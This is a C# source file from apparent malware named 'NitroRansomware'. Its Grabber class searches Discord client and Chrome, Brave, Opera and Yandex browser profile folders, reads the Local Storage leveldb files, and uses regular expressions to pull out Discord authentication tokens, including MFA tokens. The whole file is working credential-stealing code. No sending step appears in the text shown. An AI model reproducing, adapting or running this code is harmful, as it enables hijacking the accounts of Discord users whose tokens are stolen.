using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace NitroRansomware;

internal class Grabber
{
	private static List<string> target = new List<string>();

	private static void Scan()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		target.Add(folderPath + "\\Discord");
		target.Add(folderPath + "\\discordcanary");
		target.Add(folderPath + "\\discordptb");
		target.Add(folderPath + "\\\\Opera Software\\Opera Stable");
		target.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
		target.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
		target.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
	}

	public static List<string> Grab()
	{
		Scan();
		List<string> list = new List<string>();
		foreach (string item in target)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			FileInfo[] files = new DirectoryInfo(item + "\\Local Storage\\leveldb").GetFiles("*.ldb");
			for (int i = 0; i < files.Length; i++)
			{
				string input = files[i].OpenText().ReadToEnd();
				foreach (Match item2 in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
				{
					list.Add(item2.Value);
				}
				foreach (Match item3 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}
}
